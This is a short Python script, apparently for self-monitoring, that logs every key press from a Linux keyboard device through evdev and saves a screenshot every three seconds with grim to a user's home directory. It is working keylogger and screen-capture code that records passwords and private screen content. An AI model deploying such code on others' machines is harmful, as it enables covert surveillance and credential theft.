# log keyboard + screenshot every 3s

import sys
from evdev import InputDevice, categorize, ecodes
import threading
import subprocess
import time

KEYBOARD_PATH = "/dev/input/by-path/platform-i8042-serio-0-event-kbd"
KEYBOARD_LOG_PATH = "/home/soufiane/.local/share/keylogger/kb.log"
SCREEN_LOG_PATH = "/home/soufiane/.local/share/keylogger/"


def log_to_file(path, content):
    with open(path, "a") as file:
        file.write(content + "\n")


def keyboard_logger():
    try:
        device = InputDevice(KEYBOARD_PATH)
        print(f"Listening to: {device.name}", flush=True)
    except FileNotFoundError:
        print(
            f"Device not found at {KEYBOARD_PATH}. Please check the path.", flush=True
        )
        sys.exit(1)

    # Loop and read raw device events directly from the kernel
    for event in device.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            if key_event.keystate == 1:
                log_to_file(KEYBOARD_LOG_PATH, f"key press: {key_event.keycode}")


def screen_logger():
    import os

    while True:
        time.sleep(3)
        try:
            subprocess.run(
                f"sudo -i -u soufiane env "
                f"XDG_RUNTIME_DIR=/run/user/$(id -u soufiane) "
                f"WAYLAND_DISPLAY=wayland-1 "
                f"grim {SCREEN_LOG_PATH}$(date +%Y-%m-%d_%H-%M-%S).png",
                capture_output=False,
                shell=True,
                check=True,
            )

        except subprocess.CalledProcessError as e:
            print(f"Error: flameshot did not run successfully")


def main():

    # thread
    th1 = threading.Thread(target=keyboard_logger, daemon=True)
    th2 = threading.Thread(target=screen_logger, daemon=True)

    th1.start()
    th2.start()

    while True:
        pass


if __name__ == "__main__":
    main()
